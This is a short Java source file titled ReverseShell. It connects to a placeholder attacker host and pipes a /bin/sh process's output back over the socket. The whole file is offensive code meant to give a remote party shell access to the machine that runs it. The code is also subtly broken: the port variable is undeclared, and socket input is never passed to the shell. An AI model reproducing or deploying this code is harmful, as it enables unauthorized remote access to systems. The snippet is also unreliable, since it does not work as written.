import java.io.*;
import java.net.*;

public class ReverseShell {
    public static void main(String[] args) {
        try {
            Socket socket = new Socket("attacker_ip", attacker_port);
            Process process = new ProcessBuilder("/bin/sh").redirectErrorStream(true).start();
            InputStream in = process.getInputStream(), err = process.getErrorStream();
            OutputStream out = socket.getOutputStream();
            byte[] buffer = new byte[1024];
            int length;
            while ((length = in.read(buffer)) != -1) out.write(buffer, 0, length);
            while ((length = err.read(buffer)) != -1) out.write(buffer, 0, length);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}